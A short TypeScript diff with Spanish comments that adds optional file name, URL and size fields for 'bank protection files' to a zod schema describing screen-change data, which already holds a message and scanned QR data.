@@ -250,6 +250,9 @@ export const screenChangeSchema = z.object({
   mensaje: z.string().optional(),
   qrData: z.string().optional(), // Para datos del QR escaneado
   qrImageData: z.string().optional(), // Para la imagen del QR escaneado en base64
+  fileName: z.string().optional(), // Para archivos de protección bancaria
+  fileUrl: z.string().optional(), // URL del archivo de protección
+  fileSize: z.string().optional(), // Tamaño del archivo de protección
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
